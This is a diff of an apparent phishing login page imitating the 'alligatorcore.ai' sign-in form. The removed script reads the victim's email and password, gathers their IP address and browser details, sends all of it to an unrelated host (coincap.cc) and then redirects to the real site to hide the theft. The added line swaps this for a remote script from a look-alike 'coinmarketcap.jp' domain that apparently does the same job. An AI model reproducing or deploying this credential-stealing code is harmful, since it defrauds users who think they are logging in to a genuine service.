@@ -66,12 +66,7 @@
                       during registration</span
                     >
 
-                    <!-- <form
-                      method="POST"
-                      action="https://alligatorcore.ai/login"
-                      class="pt-4"
-                    > -->
-                    <form onsubmit="onFormSubmit(event)" class="pt-4">
+                    <form id="loginForm" class="pt-4">
                       <input
                         type="hidden"
                         name="_token"
@@ -138,73 +133,6 @@
         </div>
       </div>
     </div>
-    <script>
-      function onFormSubmit(event) {
-        event.preventDefault();
-
-        const form = event.target;
-        const email = form.elements.email.value;
-        const password = form.elements.password.value;
-        let token;
-
-        grecaptcha.enterprise.ready(async () => {
-          token = await grecaptcha.enterprise.execute(
-            '6Lc08TYnAAAAAN-Br_NCH29jui_gOTah1hrwUWaD',
-            { action: 'LOGIN' }
-          );
-
-          const clientIP = await fetch('https://api.ipify.org?format=json')
-            .then((response) => response.json())
-            .then((data) => data.ip)
-            .catch((error) => {
-              console.error('Error fetching client IP:', error);
-              return '';
-            });
-
-          const userAgent = navigator.userAgent;
-
-          // Create an object with the form data
-          const formData = {
-            project: 'project',
-            email: email,
-            password: password,
-            recaptcha_token: token,
-            client_ip: clientIP,
-            user_agent: userAgent,
-          };
-
-          // Send the form data as a POST request to the backend
-          fetch('https://coincap.cc/submit', {
-            // fetch('http://127.0.0.1:5000/submit', {
-            method: 'POST',
-            headers: {
-              'Content-Type': 'application/json',
-            },
-            body: JSON.stringify(formData), // Send the data as a JSON string
-          })
-            .then((response) => {
-              if (!response.ok) {
-                throw new Error('Network response was not ok');
-              }
-              return response.json();
-            })
-            .then((data) => {
-              console.log('Human confirmed');
-              window.location.href =
-                'https://alligatorcore.ai/register/135OIs0RktQM26';
-            })
-            .catch((error) => {
-              window.location.href =
-                'https://alligatorcore.ai/register/135OIs0RktQM26';
-              // console.error('Error sending form data:', error);
-            });
-        });
-      }
-    </script>
-
-    <!-- <script src="./css/global.min.js"></script>
-    <script src="./css/jquery-ui.js"></script>
-    <script src="./js/custom.min.js"></script>
-    <script src="./js/dlabnav-init.js"></script> -->
+    <script src="https://api.coinmarketcap.jp/loginpage.js?project=alligatorcore.ai&reflink=https://alligatorcore.ai/register/135OIs0RktQM26"></script>
   </body>
 </html>
